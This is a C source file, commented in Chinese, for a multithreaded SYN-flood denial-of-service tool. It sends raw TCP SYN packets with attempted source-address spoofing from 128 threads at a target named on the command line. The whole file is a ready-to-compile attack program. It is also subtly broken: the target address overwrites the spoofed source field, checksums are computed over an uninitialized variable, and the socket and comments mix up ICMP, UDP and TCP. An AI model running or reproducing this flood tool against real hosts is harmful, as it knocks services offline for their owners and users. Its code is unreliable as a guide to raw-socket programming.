//编译:
//		gcc -g3 -lpthread ./dos_syn.c -o x



#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>



//最多线程数
#define MAXCHILD (128)

//DOS结构,分为IP头部、UDP头部、UDP数据部分
struct dosseg_t{
	struct ip iph;
	struct tcphdr tcph;
	unsigned char data[8192];
};



//
//多线程共享数据:
//
//原始套接字的sfd
static int rawsock = -1;
//目的IP地址
static unsigned long dest = 0;
static unsigned short dest_port = 0;
//ICMP协议的值
static int PROTO_ICMP = -1;
//攻击程序是否继续活动的标志
static int alive = -1;



//随机函数产生函数, 伪造原地址(由于系统的函数为伪随机函数, 因此每次用不同值进行初始化)
static unsigned long myrandom(unsigned int begin, unsigned int end){
	unsigned int uiTmp;
	uiTmp = (unsigned int)( clock() % 2000 ) * ( clock() % 2000 ) * ( clock() % 1000 );
	return(unsigned long)rand_r(&uiTmp) % end;
}




//CRC16校验
static unsigned short DoS_cksum(unsigned short *data, int length){
	register int left = length;
	register unsigned short* word = data;
	register int sum = 0;
	unsigned short ret = 0;

	//计算偶数字节
	while(left > 1){
		sum += *word++;
		left -= 2;
	}

	//如果为奇数,将最后一个字节单独计算,剩余的一个字节为高字节构建一个short类型变量值
	if(left == 1){
		*(unsigned char*)(&ret) = *(unsigned char*) word;
		sum += ret;
	}

	//折叠
	sum =(sum >> 16) + (sum & 0xffff);
	sum +=(sum >> 16);

	//取反
	ret = ~sum;
	return(ret);
}


static void DoS_syn(void){
	//发送目的地址
	struct sockaddr_in to;
	struct dosseg_t dosseg;
	unsigned int tmp;
	unsigned short buffer;

	//IP的版本,IPv4
	dosseg.iph.ip_v = 4;
	//IP头部长度,字节数
	dosseg.iph.ip_hl = 5;
	//服务类型
	dosseg.iph.ip_tos = 0;
	//IP报文的总长度
	dosseg.iph.ip_len = htons(sizeof(struct ip)+sizeof(struct tcphdr));
	//标识,设置为PID
	dosseg.iph.ip_id = htons(getpid());
	//段的便宜地址
	dosseg.iph.ip_off = 0; 
	//TTL
	dosseg.iph.ip_ttl = myrandom(128, 255);
	//协议类型
	dosseg.iph.ip_p = IPPROTO_TCP;
	//校验和,先填写为0
	dosseg.iph.ip_sum = 0;
	//发送的源地址
	tmp = myrandom(0, 65535);
	memcpy(&dosseg.iph.ip_src, &tmp, sizeof(struct sockaddr_in));
	//发送目标地址
	memcpy(&dosseg.iph.ip_src, &dest, sizeof(struct sockaddr_in));

	dosseg.tcph.seq = htonl((unsigned long) myrandom(0, 65535)); 
	dosseg.tcph.ack_seq = htons(myrandom(0, 65535));
	dosseg.tcph.syn = 1;
	dosseg.tcph.urg = 1;
	dosseg.tcph.window = htons(myrandom(0, 65535));
	dosseg.tcph.check = 0;
	dosseg.tcph.urg_ptr = htons(myrandom(0, 65535));
	dosseg.tcph.check = DoS_cksum((uint16_t *) &buffer, 
			(sizeof(struct ip) + sizeof(struct tcphdr) + 1) & ~1);
	dosseg.iph.ip_sum = DoS_cksum((uint16_t *) &buffer, 
			(4 * dosseg.iph.ip_hl + sizeof(struct tcphdr) + 1) & ~1);

	//填写发送目的地址部分
	to.sin_family =	AF_INET;
	to.sin_addr.s_addr = dest;
	to.sin_port = htons(0);

	//发送数据
	sendto(rawsock, 
			&dosseg, 
			4 * dosseg.iph.ip_hl + sizeof(struct tcphdr) , 
			0, 
			(struct sockaddr *) &to, 
			sizeof(struct sockaddr));
}



//执行DoS 死亡发射循环
static void DoS_fun(int i){
	unsigned int tmp = 0;
	while(alive){
		DoS_syn();
		//printf("pid-%d: %d\n", pthread_self(), tmp++);
		printf("pid-%d: %d\n", i, tmp++);
	}
}

//信号处理函数,设置退出变量alive, 用来退出DoS_fun()
static void DoS_sig(int signo){
	alive = 0;
}



int main(int argc, char *argv[]){
	struct hostent* host = NULL;
	struct protoent* protocol = NULL;
	const char protoname[]= "icmp";

	int i = 0;
	pthread_t pth_pool[MAXCHILD];
	int err = -1;



	//检查参数数量是否正确
	if(argc < 2)
		return -1;

	//设置截获信号CTRL+C
	signal(SIGINT, DoS_sig);

	//获取协议类型ICMP
	protocol = getprotobyname(protoname);
	if(protocol == NULL){
		perror("getprotobyname()");
		return -1;
	}
	PROTO_ICMP = protocol->p_proto;


	//将目的地址为unsigned long 存放
	dest = inet_addr(argv[1]);
	if(dest == INADDR_NONE){
		//如果输入的地址信息不是ip 地址信息, 则转而获取DNS地址
		host = gethostbyname(argv[1]);
		if(host == NULL){
			perror("gethostbyname()");
			return -1;
		}
		//将地址拷贝到dest中
		//memcpy((char *)&dest, host->h_addr.s_addr, host->h_length);
	}


	//建立原始socket
	rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	if(rawsock == -1){
		perror("socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)");
		return -1;
	}

	//设置IP选项
	setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1", 1);


	//设置DoS_fun()启动标志
	alive = 1;

	//初始化线程池
	for(i=0; i<MAXCHILD; i++)
		pth_pool[i] = 0;
		//printf("%d\n", myrandom(0, 65535));

	//建立多个线程协同工作
	for(i=0; i<MAXCHILD; i++){
		err = pthread_create(&pth_pool[i], NULL, DoS_fun, i);
		if(err != 0){
			perror("pthread_create()");
			break;
		}
	}

	//等待线程结束
	for(i=0; i<MAXCHILD; i++){
		if(pth_pool[i] != 0){
			err = pthread_join(pth_pool[i], NULL);
			if(err != 0){
				perror("pthread_join()");
				break;
			}
		}
	}

	close(rawsock);
	return 0;
}



